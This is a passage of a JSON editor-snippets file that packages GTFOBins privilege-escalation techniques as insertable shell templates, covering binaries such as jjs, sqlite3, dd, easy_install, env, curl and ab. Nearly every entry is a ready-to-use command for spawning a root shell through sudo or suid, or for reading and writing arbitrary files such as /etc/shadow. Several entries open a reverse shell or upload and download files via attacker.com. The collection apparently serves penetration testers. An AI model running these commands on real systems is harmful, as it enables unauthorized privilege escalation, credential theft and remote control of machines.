        "description": "abuse jjs with suid - This has been found working in macOS but failing on Linux systems."
    },
    "jjs sudo (gtfobins)": {
        "prefix": "jjs sudo",
        "body": [
            "abuse jjs with sudo",
            "",
            "```sh",
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)').waitFor()\" | sudo jjs${0}",
            "```"
        ],
        "description": "abuse jjs with sudo"
    },
    "xmore file-read (gtfobins)": {
        "prefix": "xmore file-read",
        "body": [
            "abuse xmore with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xmore \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmore with file-read"
    },
    "xmore suid (gtfobins)": {
        "prefix": "xmore suid",
        "body": [
            "abuse xmore with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xmore \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmore with suid"
    },
    "xmore sudo (gtfobins)": {
        "prefix": "xmore sudo",
        "body": [
            "abuse xmore with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xmore \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmore with sudo"
    },
    "xdotool shell (gtfobins)": {
        "prefix": "xdotool shell",
        "body": [
            "abuse xdotool with shell",
            "",
            "```sh",
            "xdotool exec --sync /bin/sh${0}",
            "```"
        ],
        "description": "abuse xdotool with shell"
    },
    "xdotool suid (gtfobins)": {
        "prefix": "xdotool suid",
        "body": [
            "abuse xdotool with suid",
            "",
            "```sh",
            "./xdotool exec --sync /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse xdotool with suid"
    },
    "xdotool sudo (gtfobins)": {
        "prefix": "xdotool sudo",
        "body": [
            "abuse xdotool with sudo",
            "",
            "```sh",
            "sudo xdotool exec --sync /bin/sh${0}",
            "```"
        ],
        "description": "abuse xdotool with sudo"
    },
    "setarch shell (gtfobins)": {
        "prefix": "setarch shell",
        "body": [
            "abuse setarch with shell",
            "",
            "```sh",
            "setarch \\$(arch) /bin/sh${0}",
            "```"
        ],
        "description": "abuse setarch with shell"
    },
    "setarch suid (gtfobins)": {
        "prefix": "setarch suid",
        "body": [
            "abuse setarch with suid",
            "",
            "```sh",
            "./setarch \\$(arch) /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse setarch with suid"
    },
    "setarch sudo (gtfobins)": {
        "prefix": "setarch sudo",
        "body": [
            "abuse setarch with sudo",
            "",
            "```sh",
            "sudo setarch \\$(arch) /bin/sh${0}",
            "```"
        ],
        "description": "abuse setarch with sudo"
    },
    "ispell shell (gtfobins)": {
        "prefix": "ispell shell",
        "body": [
            "abuse ispell with shell",
            "",
            "```sh",
            "ispell /etc/passwd",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ispell with shell"
    },
    "ispell suid (gtfobins)": {
        "prefix": "ispell suid",
        "body": [
            "abuse ispell with suid",
            "",
            "```sh",
            "./ispell /etc/passwd",
            "!/bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ispell with suid"
    },
    "ispell sudo (gtfobins)": {
        "prefix": "ispell sudo",
        "body": [
            "abuse ispell with sudo",
            "",
            "```sh",
            "sudo ispell /etc/passwd",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ispell with sudo"
    },
    "dd file-write (gtfobins)": {
        "prefix": "dd file-write",
        "body": [
            "abuse dd with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"DATA\" | dd of=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with file-write"
    },
    "dd file-read (gtfobins)": {
        "prefix": "dd file-read",
        "body": [
            "abuse dd with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dd if=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with file-read"
    },
    "dd suid (gtfobins)": {
        "prefix": "dd suid",
        "body": [
            "abuse dd with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"data\" | ./dd of=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with suid"
    },
    "dd sudo (gtfobins)": {
        "prefix": "dd sudo",
        "body": [
            "abuse dd with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"data\" | sudo dd of=\\$LFILE${0}",
            "```"
        ],
        "description": "abuse dd with sudo"
    },
    "sqlite3 shell (gtfobins)": {
        "prefix": "sqlite3 shell",
        "body": [
            "abuse sqlite3 with shell",
            "",
            "```sh",
            "sqlite3 /dev/null '.shell /bin/sh'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with shell"
    },
    "sqlite3 file-write (gtfobins)": {
        "prefix": "sqlite3 file-write",
        "body": [
            "abuse sqlite3 with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sqlite3 /dev/null -cmd \".output \\$LFILE\" 'select \"DATA\";'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with file-write"
    },
    "sqlite3 file-read (gtfobins)": {
        "prefix": "sqlite3 file-read",
        "body": [
            "abuse sqlite3 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sqlite3 << EOF",
            "CREATE TABLE t(line TEXT);",
            ".import \\$LFILE t",
            "SELECT * FROM t;",
            "EOF${0}",
            "```"
        ],
        "description": "abuse sqlite3 with file-read"
    },
    "sqlite3 suid (gtfobins)": {
        "prefix": "sqlite3 suid",
        "body": [
            "abuse sqlite3 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sqlite3 << EOF",
            "CREATE TABLE t(line TEXT);",
            ".import \\$LFILE t",
            "SELECT * FROM t;",
            "EOF${0}",
            "```"
        ],
        "description": "abuse sqlite3 with suid"
    },
    "sqlite3 sudo (gtfobins)": {
        "prefix": "sqlite3 sudo",
        "body": [
            "abuse sqlite3 with sudo",
            "",
            "```sh",
            "sudo sqlite3 /dev/null '.shell /bin/sh'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with sudo"
    },
    "sqlite3 limited-suid (gtfobins)": {
        "prefix": "sqlite3 limited-suid",
        "body": [
            "abuse sqlite3 with limited-suid",
            "",
            "```sh",
            "./sqlite3 /dev/null '.shell /bin/sh'${0}",
            "```"
        ],
        "description": "abuse sqlite3 with limited-suid"
    },
    "dosbox file-read (gtfobins)": {
        "prefix": "dosbox file-read",
        "body": [
            "abuse dosbox with file-read, The file is copied to a readable location.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_read}'",
            "dosbox -c 'mount c /' -c \"copy c:\\$LFILE c:\\tmp\\output\" -c exit",
            "cat '/tmp/OUTPUT'${0}",
            "```"
        ],
        "description": "abuse dosbox with file-read - The file is copied to a readable location."
    },
    "dosbox file-write (gtfobins)": {
        "prefix": "dosbox file-write",
        "body": [
            "abuse dosbox with file-write, Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_write}'",
            "dosbox -c 'mount c /' -c \"echo DATA >c:\\$LFILE\" -c exit${0}",
            "```"
        ],
        "description": "abuse dosbox with file-write - Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
    },
    "dosbox suid (gtfobins)": {
        "prefix": "dosbox suid",
        "body": [
            "abuse dosbox with suid, Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_write}'",
            "./dosbox -c 'mount c /' -c \"echo DATA >c:\\$LFILE\" -c exit${0}",
            "```"
        ],
        "description": "abuse dosbox with suid - Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
    },
    "dosbox sudo (gtfobins)": {
        "prefix": "dosbox sudo",
        "body": [
            "abuse dosbox with sudo, Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
            "",
            "```sh",
            "LFILE='\\path\\to\\${1:file_to_write}'",
            "sudo dosbox -c 'mount c /' -c \"echo DATA >c:\\$LFILE\" -c exit${0}",
            "```"
        ],
        "description": "abuse dosbox with sudo - Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write."
    },
    "tic file-read (gtfobins)": {
        "prefix": "tic file-read",
        "body": [
            "abuse tic with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tic -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tic with file-read"
    },
    "tic suid (gtfobins)": {
        "prefix": "tic suid",
        "body": [
            "abuse tic with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tic -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tic with suid"
    },
    "tic sudo (gtfobins)": {
        "prefix": "tic sudo",
        "body": [
            "abuse tic with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tic -C \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tic with sudo"
    },
    "ltrace file-read (gtfobins)": {
        "prefix": "ltrace file-read",
        "body": [
            "abuse ltrace with file-read, The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ltrace -F \\$LFILE /dev/null${0}",
            "```"
        ],
        "description": "abuse ltrace with file-read - The file is parsed as a configuration file and its content is shown as error messages, thus this is not suitable to exfiltrate binary files."
    },
    "ltrace file-write (gtfobins)": {
        "prefix": "ltrace file-write",
        "body": [
            "abuse ltrace with file-write, The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "ltrace -s 999 -o \\$LFILE ltrace -F DATA${0}",
            "```"
        ],
        "description": "abuse ltrace with file-write - The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`."
    },
    "ltrace shell (gtfobins)": {
        "prefix": "ltrace shell",
        "body": [
            "abuse ltrace with shell",
            "",
            "```sh",
            "ltrace -b -L /bin/sh${0}",
            "```"
        ],
        "description": "abuse ltrace with shell"
    },
    "ltrace sudo (gtfobins)": {
        "prefix": "ltrace sudo",
        "body": [
            "abuse ltrace with sudo",
            "",
            "```sh",
            "sudo ltrace -b -L /bin/sh${0}",
            "```"
        ],
        "description": "abuse ltrace with sudo"
    },
    "7z file-read (gtfobins)": {
        "prefix": "7z file-read",
        "body": [
            "abuse 7z with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "7z a -ttar -an -so \\$LFILE | 7z e -ttar -si -so${0}",
            "```"
        ],
        "description": "abuse 7z with file-read"
    },
    "7z sudo (gtfobins)": {
        "prefix": "7z sudo",
        "body": [
            "abuse 7z with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo 7z a -ttar -an -so \\$LFILE | 7z e -ttar -si -so${0}",
            "```"
        ],
        "description": "abuse 7z with sudo"
    },
    "rc shell (gtfobins)": {
        "prefix": "rc shell",
        "body": [
            "abuse rc with shell",
            "",
            "```sh",
            "rc -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse rc with shell"
    },
    "rc suid (gtfobins)": {
        "prefix": "rc suid",
        "body": [
            "abuse rc with suid",
            "",
            "```sh",
            "./rc -c '/bin/sh -p'${0}",
            "```"
        ],
        "description": "abuse rc with suid"
    },
    "rc sudo (gtfobins)": {
        "prefix": "rc sudo",
        "body": [
            "abuse rc with sudo",
            "",
            "```sh",
            "sudo rc -c '/bin/sh'${0}",
            "```"
        ],
        "description": "abuse rc with sudo"
    },
    "bpftrace sudo (gtfobins)": {
        "prefix": "bpftrace sudo",
        "body": [
            "abuse bpftrace with sudo",
            "",
            "```sh",
            "sudo bpftrace -c /bin/sh -e 'END {exit()}'${0}",
            "```"
        ],
        "description": "abuse bpftrace with sudo"
    },
    "tmate shell (gtfobins)": {
        "prefix": "tmate shell",
        "body": [
            "abuse tmate with shell",
            "",
            "```sh",
            "tmate -c /bin/sh${0}",
            "```"
        ],
        "description": "abuse tmate with shell"
    },
    "tmate sudo (gtfobins)": {
        "prefix": "tmate sudo",
        "body": [
            "abuse tmate with sudo",
            "",
            "```sh",
            "sudo tmate -c /bin/sh${0}",
            "```"
        ],
        "description": "abuse tmate with sudo"
    },
    "tmate limited-suid (gtfobins)": {
        "prefix": "tmate limited-suid",
        "body": [
            "abuse tmate with limited-suid",
            "",
            "```sh",
            "./tmate -c /bin/sh${0}",
            "```"
        ],
        "description": "abuse tmate with limited-suid"
    },
    "xpad file-read (gtfobins)": {
        "prefix": "xpad file-read",
        "body": [
            "abuse xpad with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xpad -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse xpad with file-read"
    },
    "xpad sudo (gtfobins)": {
        "prefix": "xpad sudo",
        "body": [
            "abuse xpad with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xpad -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse xpad with sudo"
    },
    "dmesg file-read (gtfobins)": {
        "prefix": "dmesg file-read",
        "body": [
            "abuse dmesg with file-read, This is not suitable for binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "dmesg -rF \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse dmesg with file-read - This is not suitable for binary files."
    },
    "dmesg shell (gtfobins)": {
        "prefix": "dmesg shell",
        "body": [
            "abuse dmesg with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "dmesg -H",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse dmesg with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "dmesg sudo (gtfobins)": {
        "prefix": "dmesg sudo",
        "body": [
            "abuse dmesg with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo dmesg -H",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse dmesg with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "crash shell (gtfobins)": {
        "prefix": "crash shell",
        "body": [
            "abuse crash with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "crash -h",
            "!sh${0}",
            "```"
        ],
        "description": "abuse crash with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "crash command (gtfobins)": {
        "prefix": "crash command",
        "body": [
            "abuse crash with command",
            "",
            "```sh",
            "COMMAND='/usr/bin/id'",
            "CRASHPAGER=\"\\$COMMAND\" crash -h${0}",
            "```"
        ],
        "description": "abuse crash with command"
    },
    "crash sudo (gtfobins)": {
        "prefix": "crash sudo",
        "body": [
            "abuse crash with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo crash -h",
            "!sh${0}",
            "```"
        ],
        "description": "abuse crash with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "pidstat command (gtfobins)": {
        "prefix": "pidstat command",
        "body": [
            "abuse pidstat with command",
            "",
            "```sh",
            "COMMAND=id",
            "pidstat -e \\$COMMAND${0}",
            "```"
        ],
        "description": "abuse pidstat with command"
    },
    "pidstat sudo (gtfobins)": {
        "prefix": "pidstat sudo",
        "body": [
            "abuse pidstat with sudo",
            "",
            "```sh",
            "COMMAND=id",
            "sudo pidstat -e \\$COMMAND${0}",
            "```"
        ],
        "description": "abuse pidstat with sudo"
    },
    "pidstat suid (gtfobins)": {
        "prefix": "pidstat suid",
        "body": [
            "abuse pidstat with suid",
            "",
            "```sh",
            "COMMAND=id",
            "./pidstat -e \\$COMMAND${0}",
            "```"
        ],
        "description": "abuse pidstat with suid"
    },
    "easy_install shell (gtfobins)": {
        "prefix": "easy_install shell",
        "body": [
            "abuse easy_install with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with shell"
    },
    "easy_install reverse-shell (gtfobins)": {
        "prefix": "easy_install reverse-shell",
        "body": [
            "abuse easy_install with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "TF=\\$(mktemp -d)",
            "echo 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "easy_install file-upload (gtfobins)": {
        "prefix": "easy_install file-upload",
        "body": [
            "abuse easy_install with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "TF=\\$(mktemp -d)",
            "echo 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-upload - Serve files in the local folder running an HTTP server."
    },
    "easy_install file-download (gtfobins)": {
        "prefix": "easy_install file-download",
        "body": [
            "abuse easy_install with file-download, Fetch a remote file via HTTP GET request. The file path must be absolute.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo \"import os;",
            "os.execl('\\$(whereis python)', '\\$(whereis python)', '-c', \\\"\\\"\\\"import sys;",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve('\\$URL', '\\$LFILE')\\\"\\\"\\\")\" > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-download - Fetch a remote file via HTTP GET request. The file path must be absolute."
    },
    "easy_install file-write (gtfobins)": {
        "prefix": "easy_install file-write",
        "body": [
            "abuse easy_install with file-write, The file path must be absolute.",
            "",
            "```sh",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo \"import os;",
            "os.execl('\\$(whereis python)', 'python', '-c', 'open(\\\"\\$LFILE\\\",\\\"w+\\\").write(\\\"DATA\\\")')\" > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-write - The file path must be absolute."
    },
    "easy_install file-read (gtfobins)": {
        "prefix": "easy_install file-read",
        "body": [
            "abuse easy_install with file-read, The read file content is wrapped within program messages.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'print(open(\"${1:file_to_read}\").read())' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with file-read - The read file content is wrapped within program messages."
    },
    "easy_install library-load (gtfobins)": {
        "prefix": "easy_install library-load",
        "body": [
            "abuse easy_install with library-load",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > \\$TF/setup.py",
            "easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with library-load"
    },
    "easy_install sudo (gtfobins)": {
        "prefix": "easy_install sudo",
        "body": [
            "abuse easy_install with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "sudo easy_install \\$TF${0}",
            "```"
        ],
        "description": "abuse easy_install with sudo"
    },
    "env shell (gtfobins)": {
        "prefix": "env shell",
        "body": [
            "abuse env with shell",
            "",
            "```sh",
            "env /bin/sh${0}",
            "```"
        ],
        "description": "abuse env with shell"
    },
    "env suid (gtfobins)": {
        "prefix": "env suid",
        "body": [
            "abuse env with suid",
            "",
            "```sh",
            "./env /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse env with suid"
    },
    "env sudo (gtfobins)": {
        "prefix": "env sudo",
        "body": [
            "abuse env with sudo",
            "",
            "```sh",
            "sudo env /bin/sh${0}",
            "```"
        ],
        "description": "abuse env with sudo"
    },
    "bconsole shell (gtfobins)": {
        "prefix": "bconsole shell",
        "body": [
            "abuse bconsole with shell",
            "",
            "```sh",
            "bconsole",
            "@exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse bconsole with shell"
    },
    "bconsole sudo (gtfobins)": {
        "prefix": "bconsole sudo",
        "body": [
            "abuse bconsole with sudo",
            "",
            "```sh",
            "sudo bconsole",
            "@exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse bconsole with sudo"
    },
    "bconsole file-read (gtfobins)": {
        "prefix": "bconsole file-read",
        "body": [
            "abuse bconsole with file-read, The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files.",
            "",
            "```sh",
            "bconsole -c /etc/shadow${0}",
            "```"
        ],
        "description": "abuse bconsole with file-read - The file is actually parsed and the first wrong line is returned in an error message, thus it may not be suitable for reading arbitrary files."
    },
    "base64 file-read (gtfobins)": {
        "prefix": "base64 file-read",
        "body": [
            "abuse base64 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "base64 \"\\$LFILE\" | base64 --decode${0}",
            "```"
        ],
        "description": "abuse base64 with file-read"
    },
    "base64 suid (gtfobins)": {
        "prefix": "base64 suid",
        "body": [
            "abuse base64 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./base64 \"\\$LFILE\" | base64 --decode${0}",
            "```"
        ],
        "description": "abuse base64 with suid"
    },
    "base64 sudo (gtfobins)": {
        "prefix": "base64 sudo",
        "body": [
            "abuse base64 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo base64 \"\\$LFILE\" | base64 --decode${0}",
            "```"
        ],
        "description": "abuse base64 with sudo"
    },
    "terraform file-read (gtfobins)": {
        "prefix": "terraform file-read",
        "body": [
            "abuse terraform with file-read",
            "",
            "```sh",
            "terraform console",
            "file(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse terraform with file-read"
    },
    "terraform sudo (gtfobins)": {
        "prefix": "terraform sudo",
        "body": [
            "abuse terraform with sudo",
            "",
            "```sh",
            "sudo terraform console",
            "file(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse terraform with sudo"
    },
    "terraform suid (gtfobins)": {
        "prefix": "terraform suid",
        "body": [
            "abuse terraform with suid",
            "",
            "```sh",
            "./terraform console",
            "file(\"${1:file_to_read}\")${0}",
            "```"
        ],
        "description": "abuse terraform with suid"
    },
    "zypper shell (gtfobins)": {
        "prefix": "zypper shell",
        "body": [
            "abuse zypper with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "cp /bin/sh \\$TF/zypper-x",
            "export PATH=\\$TF:\\$PATH",
            "zypper x${0}",
            "```"
        ],
        "description": "abuse zypper with shell"
    },
    "zypper sudo (gtfobins)": {
        "prefix": "zypper sudo",
        "body": [
            "abuse zypper with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "cp /bin/sh \\$TF/zypper-x",
            "sudo PATH=\\$TF:\\$PATH zypper x${0}",
            "```"
        ],
        "description": "abuse zypper with sudo"
    },
    "aoss shell (gtfobins)": {
        "prefix": "aoss shell",
        "body": [
            "abuse aoss with shell",
            "",
            "```sh",
            "aoss /bin/sh${0}",
            "```"
        ],
        "description": "abuse aoss with shell"
    },
    "aoss sudo (gtfobins)": {
        "prefix": "aoss sudo",
        "body": [
            "abuse aoss with sudo",
            "",
            "```sh",
            "sudo aoss /bin/sh${0}",
            "```"
        ],
        "description": "abuse aoss with sudo"
    },
    "curl file-upload (gtfobins)": {
        "prefix": "curl file-upload",
        "body": [
            "abuse curl with file-upload, Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "curl -X POST -d \"@\\$LFILE\" \\$URL${0}",
            "```"
        ],
        "description": "abuse curl with file-upload - Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data."
    },
    "curl file-download (gtfobins)": {
        "prefix": "curl file-download",
        "body": [
            "abuse curl with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "curl \\$URL -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with file-download - Fetch a remote file via HTTP GET request."
    },
    "curl file-read (gtfobins)": {
        "prefix": "curl file-read",
        "body": [
            "abuse curl with file-read, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=/tmp/${1:file_to_read}",
            "curl file://\\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with file-read - The file path must be absolute."
    },
    "curl file-write (gtfobins)": {
        "prefix": "curl file-write",
        "body": [
            "abuse curl with file-write, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "curl \"file://\\$TF\" -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse curl with file-write - The file path must be absolute."
    },
    "curl suid (gtfobins)": {
        "prefix": "curl suid",
        "body": [
            "abuse curl with suid, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "./curl \\$URL -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with suid - Fetch a remote file via HTTP GET request."
    },
    "curl sudo (gtfobins)": {
        "prefix": "curl sudo",
        "body": [
            "abuse curl with sudo, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "sudo curl \\$URL -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse curl with sudo - Fetch a remote file via HTTP GET request."
    },
    "ncftp shell (gtfobins)": {
        "prefix": "ncftp shell",
        "body": [
            "abuse ncftp with shell",
            "",
            "```sh",
            "ncftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ncftp with shell"
    },
    "ncftp suid (gtfobins)": {
        "prefix": "ncftp suid",
        "body": [
            "abuse ncftp with suid",
            "",
            "```sh",
            "./ncftp",
            "!/bin/sh -p${0}",
            "```"
        ],
        "description": "abuse ncftp with suid"
    },
    "ncftp sudo (gtfobins)": {
        "prefix": "ncftp sudo",
        "body": [
            "abuse ncftp with sudo",
            "",
            "```sh",
            "sudo ncftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ncftp with sudo"
    },
    "ab file-upload (gtfobins)": {
        "prefix": "ab file-upload",
        "body": [
            "abuse ab with file-upload, Upload local file via HTTP POST request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "ab -p \\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with file-upload - Upload local file via HTTP POST request."
    },
    "ab file-download (gtfobins)": {
        "prefix": "ab file-download",
        "body": [
            "abuse ab with file-download, Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/${1:file_to_download}",
            "ab -v2 \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with file-download - Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length."
    },
    "ab suid (gtfobins)": {
        "prefix": "ab suid",
        "body": [
            "abuse ab with suid, Upload local file via HTTP POST request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "./ab -p \\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse ab with suid - Upload local file via HTTP POST request."
    },
    "ab sudo (gtfobins)": {
        "prefix": "ab sudo",
        "body": [
            "abuse ab with sudo, Upload local file via HTTP POST request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
